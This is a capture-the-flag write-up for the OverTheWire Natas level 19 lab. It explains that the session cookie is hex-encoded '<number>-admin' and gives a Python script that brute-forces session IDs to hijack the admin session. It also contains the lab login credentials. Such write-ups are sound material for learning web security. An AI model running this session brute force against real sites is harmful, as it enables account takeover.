# This is a write-up for Natas - level 19

This challenge is quite similar to the previous one, so I won't repeat myself too much. Check that out in the parent folder.

## Solution
Immediately I notice the missing "view sourcecode" button. However, since the problem is similar to the previous one I go and have a look there.
Recalling my solution, I figure that PHPSESSID has to be a key part of the solution this time again.

I look at the PHPSESSID with inspect and see that it is a long string of numbers and letters.
It looks like hex, so I try to decrypt it on the site:

https://www.rapidtables.com/convert/number/hex-to-ascii.html

It does turn out to be hex! More specifically, the decrypted string is a number, a dash, and the username I entered.

This means I can probably brute-force the solution again! I just have to use "admin" as the username and try a bunch of different numbers.

Initially, I ran the script with the cookie format PHPSESSID: \<number\>-admin.

The sharp reader will notice that I am not using the correct format. I first need to encrypt this into hex!
This is quite easy to do in python with 'ord', which takes a character and returns its ascii code, and 'hex' which converts a number from decimal to hexadecimal.

I put together a quick function that encrypts an entire string using ord and hex. 

My guess was that the range of numbers would still be 640. If I was wrong, I could always brute force more numbers.

Here is the script:

```python 
import requests
from requests.auth import HTTPBasicAuth

basicAuth=HTTPBasicAuth('natas19', 'tnwER7PdfWkxsG4FNWUtoAZ9VyZTJqJr')
headers = {'Content-Type': 'application/x-www-form-urlencoded'}

u="http://natas19.natas.labs.overthewire.org/index.php"

def hexencrypt(input_string):
    encrypted = ""
    for letter in input_string:
        # ord converts letter to its ascii code.
        # hex converts the ascii code to hex
        # the hex representation of each character begins with '0x' which we don't care about for this challenge
        # [2:] weeds out the first characters
        encrypted+=str(hex(ord(letter)))[2:]
    return encrypted

for i in range(1,641):
    id_in_hex=hexencrypt(str(i) + "-admin")
    payload = {"PHPSESSID": id_in_hex}
    # This line stores the response from the server
    response = requests.get(u, cookies=payload, headers=headers, auth=basicAuth, verify=False)
    # I print the cookie in its hex-form just out of curiosity
    print(i, id_in_hex)
    if "You are an admin" in response.text:
        print(response.text)
        print("the admins session id was:", i)
        break
```
